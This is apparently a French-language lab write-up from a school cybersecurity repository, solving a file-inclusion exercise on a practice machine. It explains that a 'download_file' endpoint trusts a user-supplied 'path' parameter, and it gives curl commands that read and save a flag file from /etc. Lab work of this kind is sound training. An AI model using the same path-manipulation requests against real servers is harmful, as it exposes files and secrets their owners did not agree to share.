# 0x07 - File Inclusion

## Description
Ce dossier contient la résolution de la task **0 (File Hub)** du module *File Inclusion*.

Objectif: récupérer le flag stocké sur la machine cible dans:

`/etc/0-flag.txt`

## Cible
- Target Machine: `Cyber - WebSec 0x07`
- Main Endpoint: `http://web0x07.hbtn/task0/list_file`

## Vulnérabilité identifiée
La page `list_file` référence un endpoint de téléchargement qui accepte des paramètres utilisateurs:
- `filename`
- `path`

Endpoint vulnérable:

`/task0/download_file`

Le serveur ne valide pas correctement le chemin fourni dans `path`, ce qui permet de lire un fichier arbitraire.

## Exploitation
1. Vérification du point d’entrée:
```bash
curl -s "http://web0x07.hbtn/task0/list_file"
```

2. Lecture directe du flag via l’endpoint vulnérable:
```bash
curl -s "http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=/etc"
```

3. Sauvegarde du résultat dans le fichier attendu:
```bash
curl -s "http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=/etc" > 0-flag.txt
```

## Résultat
Flag récupéré et enregistré dans:

`web_application_security/0x07_file_inclusion/0-flag.txt`

## Repo
- GitHub repository: `holbertonschool-cyber_security`
- Directory: `web_application_security/0x07_file_inclusion`
- File: `0-flag.txt`
